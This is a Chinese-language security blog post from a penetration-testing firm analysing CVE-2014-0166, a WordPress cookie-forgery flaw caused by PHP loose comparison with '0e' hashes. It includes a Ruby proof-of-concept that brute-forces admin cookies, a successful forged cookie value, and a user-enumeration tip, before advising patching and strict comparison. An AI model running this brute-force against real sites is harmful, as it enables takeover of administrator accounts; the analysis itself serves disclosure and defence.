
<!DOCTYPE html>
<html lang="zh-TW">
  <head>
    <meta charset="utf-8" />
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>CVE-2014-0166 WordPress 偽造 Cookie 弱點 | DEVCORE 戴夫寇爾</title><link href="/assets/themes/devcore-v2/stylesheets/webpack_bundle.css" rel="stylesheet" />
    <link href="/assets/themes/devcore-v2/images/favicon.png" rel="icon" size="32x32">
    <meta name="description" property="og:description" content="CVE-2014-0166 是 WordPress 上面驗證登入 cookie 的弱點，攻擊者可以暴力偽造出合法 cookie，藉此獲得 WordPress 最高權限，進而拿到 shell 取得系統操作權。" />
    <meta name="keywords" content="" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="CVE-2014-0166 WordPress 偽造 Cookie 弱點 | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="https://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities/" />
    <meta property="og:type" content="website" />
    
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="CVE-2014-0166 WordPress 偽造 Cookie 弱點 | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="CVE-2014-0166 是 WordPress 上面驗證登入 cookie 的弱點，攻擊者可以暴力偽造出合法 cookie，藉此獲得 WordPress 最高權限，進而拿到 shell 取得系統操作權。">
    <meta name="twitter:creator" content="d3vc0r3">
    
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">

    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-K5B8NW');</script>
    <!-- End Google Tag Manager -->
  </head>
  <body>
    <div class="page">
      <div class="container--wrapper">
        <div class="topbar">
          <div class="topbar__brand">
            <a href="/">
                <div class="logo">
                  DEVCORE 戴夫寇爾
                </div></a>
            <p class="slogan">
              我們提供<a href="/services/penetration-test" class="link">滲透測試</a>、<a href="/services/red-team" class="link">紅隊演練</a>、<a href="/services/security-consulting" class="link">資安顧問</a>與<a href="/services/security-training" class="link">教育訓練</a>服務
            </p>
          </div>
          <div class="drawer" id="drawer">
            <div class="drawer__container">
              <nav class="main-menu">
                <div class="hidden">
                  主選單
                </div>
                <a href="/services/penetration-test" class="main-menu__link mobile-only">滲透測試</a>
                <a href="/services/red-team" class="main-menu__link mobile-only">紅隊演練</a>
                <a href="/services/security-consulting" class="main-menu__link mobile-only">資安顧問</a>
                <a href="/services/security-training" class="main-menu__link mobile-only">教育訓練</a>
                <a href="/about/" class="main-menu__link">駭客思維</a><a href="/blog/" class="main-menu__link">最新訊息</a><a href="/search/" class="main-menu__link main-menu__search desktop-only"><span class="hidden">搜尋</span><svg class="icon-search icon"><use xlink:href="#icon-search" /></svg></a>
              </nav>
              <a href="/contact/" class="drawer__contact button--dense">聯絡我們</a>
              <nav class="lang-menu">
                <div class="lang-menu__label">
                  語言:
                </div>
                <a href="/" class="lang-menu__link">中文</a>
                <a href="/en/" class="lang-menu__link">English</a>
              </nav>
            </div>
          </div><span class="topbar__menu mobile-only">menu</span><button class="appearance-none topbar__hamburger mobile-only" data-toggle="#drawer" id="drawer-toggle" type="button">
            <div class="bars">
              <div class="bar"></div>
              <div class="bar"></div>
              <div class="bar"></div>
            </div>
          </button>
        </div>
      </div><main role="main">


          <div class="container--wrapper">
            <div class="container">
              <section class="blog-header">
                <small class="blog-header__category"><a href="/blog/category/技術專欄/">技術專欄</a></small>
                
                <h1 class="blog-header__title">
                  CVE-2014-0166 WordPress 偽造 Cookie 弱點
                </h1>
                <div class="blog-header__tags">
                  
                  <a href="/blog/tag/Vulnerability/" class="blog-header__tag">Vulnerability</a><a href="/blog/tag/CVE/" class="blog-header__tag">CVE</a><a href="/blog/tag/WordPress/" class="blog-header__tag">WordPress</a><a href="/blog/tag/Brute-force/" class="blog-header__tag">Brute-force</a>
                </div>
          
          
                <p class="blog-header__info">
                  By <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/shaolinhsu.jpg)"></span> <a href="/blog/author/shaolin" class="author-name">Shaolin</a> <time class="date">on 2014-04-16 </time>
                </p>
          
              </section>
              <article class="article">
          <h3 id="前言">前言</h3>

<p>在一陣 OpenSSL Heartbleed 淘金潮中，又有一個技術門檻低、後果嚴重、也同樣需要些運氣的漏洞被揭發－<a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0166">CVE-2014-0166</a>。CVE-2014-0166 是 WordPress 上面驗證登入 cookie 的弱點，攻擊者可以暴力偽造出合法 cookie，藉此獲得 WordPress 最高權限，進而拿到 shell 取得系統操作權。<br />
讓我們來分析一下這次的弱點是發生了什麼事吧！</p>

<!-- more -->

<h3 id="解析">解析</h3>

<p>這次出問題的程式碼在<a href="https://github.com/WordPress/WordPress/blob/684145ca8101e9ba5d9b4516709121fbe0fb9aee/wp-includes/pluggable.php#L650">這邊</a>，關鍵程式碼如下：</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="nv">$key</span> <span class="o">=</span> <span class="nx">wp_hash</span><span class="p">(</span><span class="nv">$username</span> <span class="o">.</span> <span class="nv">$pass_frag</span> <span class="o">.</span> <span class="s1">&#39;|&#39;</span> <span class="o">.</span> <span class="nv">$expiration</span><span class="p">,</span> <span class="nv">$scheme</span><span class="p">);</span>
<span class="nv">$hash</span> <span class="o">=</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">,</span> <span class="nv">$username</span> <span class="o">.</span> <span class="s1">&#39;|&#39;</span> <span class="o">.</span> <span class="nv">$expiration</span><span class="p">,</span> <span class="nv">$key</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span> <span class="nv">$hmac</span> <span class="o">!=</span> <span class="nv">$hash</span> <span class="p">)</span> <span class="p">{</span>
  <span class="sd">/**</span>
<span class="sd">   * Fires if a bad authentication cookie hash is encountered.</span>
<span class="sd">   *</span>
<span class="sd">   * @since 2.7.0</span>
<span class="sd">   *</span>
<span class="sd">   * @param array $cookie_elements An array of data for the authentication cookie.</span>
<span class="sd">   */</span>
  <span class="nx">do_action</span><span class="p">(</span> <span class="s1">&#39;auth_cookie_bad_hash&#39;</span><span class="p">,</span> <span class="nv">$cookie_elements</span> <span class="p">);</span>
  <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="p">}</span></code></pre></div>

<p>問題主要發生在比較運算子 != 上面，!= 運算子是 non-strict，會在比較前先做型態轉換，所以下面看似應該是回傳 true 的例子，全部都顯示為 false，細節請參閱<a href="http://www.php.net/manual/en/language.operators.comparison.php">官方手冊</a>。</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="nb">var_dump</span><span class="p">(</span><span class="mi">0</span> <span class="o">!=</span> <span class="s2">&quot;a&quot;</span><span class="p">);</span> <span class="c1">// 0 != 0 -&gt; false</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="s2">&quot;1&quot;</span> <span class="o">!=</span> <span class="s2">&quot;01&quot;</span><span class="p">);</span> <span class="c1">// 1 != 1 -&gt; false</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="s2">&quot;10&quot;</span> <span class="o">!=</span> <span class="s2">&quot;1e1&quot;</span><span class="p">);</span> <span class="c1">// 10 != 10 -&gt; false</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="mi">100</span> <span class="o">!=</span> <span class="s2">&quot;1e2&quot;</span><span class="p">);</span> <span class="c1">// 100 != 100 -&gt; false</span>
<span class="nb">var_dump</span><span class="p">(</span> <span class="s2">&quot;0&quot;</span> <span class="o">!=</span> <span class="s2">&quot;0e10123456789012345678901234567890&quot;</span> <span class="p">);</span> <span class="c1">// 0 != 0 -&gt; false</span></code></pre></div>

<p>進入正題，WordPress 認證身分用的 cookie 內容是這樣的：『username|expiration|hmac』。<br /><br />
username 是使用者名稱，<br /><br />
expiration 是有效期限(timestamp)，<br /><br />
hmac 值用來驗證 cookie 是否合法。<br /><br />
從上面程式碼可以看到，hmac 的算法是經過 username、pass_frag、expiration、key 綜合得出。若有辦法控制 cookie 中的 hmac 使伺服器認為該 cookie 合法，就可以成功偽造成 username。</p>

<p>利用稍早提到的比較運算子問題，若我們讓 cookie 中的 hmac 值為 0，很有可能讓判斷式變成下面這樣：</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="c1">//if ( $hmac != $hash ) {</span>
  <span class="k">if</span> <span class="p">(</span> <span class="s2">&quot;0&quot;</span> <span class="o">!=</span> <span class="s2">&quot;0e10123456789012345678901234567890&quot;</span> <span class="p">)</span> <span class="p">{</span>
    <span class="nx">do_action</span><span class="p">(</span> <span class="s1">&#39;auth_cookie_bad_hash&#39;</span><span class="p">,</span> <span class="nv">$cookie_elements</span> <span class="p">);</span>
    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
  <span class="p">}</span></code></pre></div>

<p>如此便可以通過驗證，成功偽造合法 cookie。<br /><br />
而為了讓 $hash == 0，可以不斷改變 cookie 中的 expiration，讓產生的 MD5 值($hash)經過型態轉換後剛好變成 0。<br /><br />
符合 $hash == 0 的 MD5 $hash 值有 <br />
0eXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX、00eXXXXXXXXXXXXXXXXXXXXXXXXXXXXX….000000000000000000000000000eX、00000000000000000000000000000 (X = 0,1,2,3,4,5,6,7,8,9)</p>

<p>故出現 $hash == 0 的機率為 Sum(10^n,n=0,30)/16^32 = 3.265262085617465e-09</p>

<p>每次偽造的成功機率約為三億分之一，並不會很高，但已經足夠在一個月內拿到最高權限，而且所耗成本並不會很高。</p>

<h3 id="實驗">實驗</h3>

<p>為了驗證此方法之可行性，我們架設了 <a href="http://tw.WordPress.org/WordPress-3.8.1-zh_TW.zip">WordPress 3.8.1</a> 環境。並且寫程式將登入 cookie 中的 hmac 設為 0，不斷調整 expiration 值測試是否已經登入，程式如下：</p>

<div class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;httpclient&#39;</span>

<span class="n">http</span> <span class="o">=</span> <span class="no">HTTPClient</span><span class="o">.</span><span class="n">new</span>

<span class="n">cookie_name</span> <span class="o">=</span> <span class="s2">&quot;WordPress_logged_in_de5be3cf9fcea023a1303527e10ea67a&quot;</span>
<span class="n">timestamp</span> <span class="o">=</span> <span class="no">Time</span><span class="o">.</span><span class="n">now</span><span class="o">.</span><span class="n">to_i</span>

<span class="p">(</span><span class="n">timestamp</span><span class="o">.</span><span class="n">.timestamp</span><span class="o">+</span><span class="mi">800000000</span><span class="p">)</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">time</span><span class="o">|</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://domain.my/WordPress/&#39;</span><span class="p">,</span> <span class="kp">nil</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;Cookie&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">cookie_name</span><span class="si">}</span><span class="s2">=admin%7C</span><span class="si">#{</span><span class="n">time</span><span class="si">}</span><span class="s2">%7C0&quot;</span><span class="p">})</span>
  <span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">body</span><span class="o">.</span><span class="n">include?</span> <span class="s1">&#39;logout&#39;</span>
    <span class="nb">puts</span> <span class="s2">&quot;admin%7C</span><span class="si">#{</span><span class="n">time</span><span class="si">}</span><span class="s2">%7C0&quot;</span>
    <span class="k">break</span>
  <span class="k">end</span>
<span class="k">end</span></code></pre></div>

<blockquote>
  <p>註：此程式為 POC，請自行調整為多執行緒版本，不然速度會很慢。</p>
</blockquote>

<p>經過一段長時間的等待，得到的結果如下：</p>

<p><a href="/assets/img/blog/20140416/iTerm.png"><img src="/assets/img/blog/20140416/iTerm.png" alt="暴力偽造 cookie，直到成功登入" title="暴力偽造 cookie，直到成功登入" /></a></p>

<p>得知當 cookie 中的 username 為 admin 且 expiration 值為 1421818232 時，伺服器算出來的 hmac 經過型態轉換會變成 0。我們將測試成功的 cookie 值： admin%7C1421818232%7C0 貼到瀏覽器上。成功變成 admin 如下圖，實驗成功！</p>

<p><a href="/assets/img/blog/20140416/Mantra1.png"><img src="/assets/img/blog/20140416/Mantra1.png" alt="利用偽造的 cookie 登入 WordPress" title="利用偽造的 cookie 登入 WordPress" /></a></p>

<blockquote>
  <p>註：一般狀況，若不知道 WordPress 最高權限的帳號，可以利用 WordPress 的 feature 在 http://your.WordPress.com/?author=$id ($id: 1,2,3,4…,999,…) 頁面中列舉所有使用者帳號。通常 $id = 1 的 author 都有 WordPress 的管理權限。</p>
</blockquote>

<h3 id="結論">結論</h3>

<p>最近出現了一個高風險通報 CVE-2014-0166，其中提及 WordPress 在舊版驗證 cookie 的部分出現弱點，可以偽造合法 cookie，進而取得 WordPress 管理權限。本文分析了其原理，並且證實之。</p>

<p>對於攻擊者而言，雖然每次偽造 cookie 成功的機率約為三億分之一並不高，但發送三億個 request 後或許能拿到最高權限，已經是值得投資的級數。</p>

<p>對於 WordPress 管理者而言，建議立即更新至 3.8.2 以後版本，以免受到此風險攻擊。</p>

<p>從此事件也提醒了 PHP 開發者，在撰寫重要的驗證行為，要特別注意 PHP 比較運算子的特性，請使用 === (不等於請用 !==)來保證等式左右型態與值為一樣，避免因為轉型造成的資安風險。</p>


              </article>
              <p class="sns-widgets">
                Share this on <button class="appearance-none sns-widgets__button" id="sns-facebook" type="button">Facebook</button> or <button class="appearance-none sns-widgets__button" id="sns-twitter" type="button">Twitter</button>
              </p>
          
              <div class="heading--side-lined">
                About <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/shaolinhsu.jpg)"></span> <a href="/blog/author/shaolin" class="blog-author-name">Shaolin</a> 
              </div>
              <p class="blog-author-info">
                喜愛資訊技術、喜歡跟別人走不一樣的路。有一點點智障的熱血人，期望能利用資訊的力量對世界有所貢獻。
              </p>
          
              <div class="heading--side-lined">
                讀者留言
              </div>
              <div class="blog-comments">
                


  <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_developer = 1;
    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>




              </div>
            </div>
          </div>






</main>
      <div class="container--wrapper">

        <div class="relative-posts">
          <div class="heading--side-lined container">
            最新消息
          </div>
          <div class="relative-posts__cells">
  
            <section class="card">
              <a href="/blog/2020/10/30/devcore-wargame-at-hitcon-2020/">
                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20201030/cover.png)"></div>
                <h3 class="card__title">
                  DEVCORE Wargame at HITCON 2020
                </h3></a>
              <div class="card__tags">
  
                <a href="/blog/tag/PHP/" class="card__tag">PHP</a><a href="/blog/tag/RCE/" class="card__tag">RCE</a>
              </div>
              <small class="card__category"><a href="/blog/category/技術專欄/">技術專欄</a></small>
            </section>
  
            <section class="card">
              <a href="/blog/2020/10/13/mitigate-real-threats-by-framework-and-standards/">
                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20201013/5.png)"></div>
                <h3 class="card__title">
                  你的資安策略夠明確嗎？透過框架優先緩解真實威脅
                </h3></a>
              <div class="card__tags">
  
                <a href="/blog/tag/Strategy/" class="card__tag">Strategy</a>
              </div>
              <small class="card__category"><a href="/blog/category/科普文章/">科普文章</a></small>
            </section>
  
            <section class="card">
              <a href="/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM/">
                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20200912/5.png)"></div>
                <h3 class="card__title">
                  看我如何再一次駭進 Facebook，一個在 MobileIron MDM 上的遠端程式碼執行漏洞!
                </h3></a>
              <div class="card__tags">
  
                <a href="/blog/tag/Advisory/" class="card__tag">Advisory</a><a href="/blog/tag/CVE/" class="card__tag">CVE</a><a href="/blog/tag/RCE/" class="card__tag">RCE</a><a href="/blog/tag/Facebook/" class="card__tag">Facebook</a><a href="/blog/tag/BugBounty/" class="card__tag">BugBounty</a>
              </div>
              <small class="card__category"><a href="/blog/category/技術專欄/">技術專欄</a></small>
            </section>
  
          </div>
        </div>


        <div class="contact-section container">
          <h2 class="contact-section__title">
            用最真實的攻擊，驗證企業的防禦
          </h2>
          <a href="/contact/" class="home-contact__button button--dense">聯絡我們</a>
        </div>

        <footer class="main-footer">
          <div class="main-footer__about">
            戴夫寇爾提供<br class="mobile-only" /><a href="/services/penetration-test" class="link">滲透測試</a>、<a href="/services/red-team" class="link">紅隊演練</a>、<a href="/services/security-consulting" class="link">資安顧問</a>與<a href="/services/security-training" class="link">教育訓練</a>服務<br />在<a href="https://www.facebook.com/D3VC0RE" class="link" target="_blank">Facebook</a>或<a href="https://twitter.com/d3vc0r3" class="link" target="_blank">Twitter</a>上追蹤我們的<a href="/blog/" class="link">最新訊息</a><br />瞭解更多戴夫寇爾的<a href="/about/" class="link">駭客思維</a>
          </div>
          <div class="main-footer__snses"><a href="https://www.facebook.com/D3VC0RE" class="main-footer__sns" target="_blank">
                <svg class="icon-fb icon"><use xlink:href="#icon-fb" /></svg></a><a href="https://twitter.com/d3vc0r3" class="main-footer__sns" target="_blank">
                <svg class="icon-twitter icon"><use xlink:href="#icon-twitter" /></svg></a>
          </div>
          <address class="main-footer__address">
            <ul class="list--unstyled">
              <li>
                地址 10487 台北市中山區復興北路 168 號 10 樓
              </li>
              <li>
                Email contact@devco.re
              </li>
              <li>
                電話 02-2718-0156
              </li>
              <li>
                統編 53955237
              </li>
            </ul>
          </address><small class="main-footer__copyright"><a href="/" class="logo">DEVCORE</a>©2021 DEVCORE 戴夫寇爾</small>
        </footer>
      </div>
    </div>
    <script src="/assets/themes/devcore-v2/javascripts/webpack_bundle.js"></script>



  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-30830800-1']);
  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>




    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-K5B8NW"
    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->

  </body>
</html>




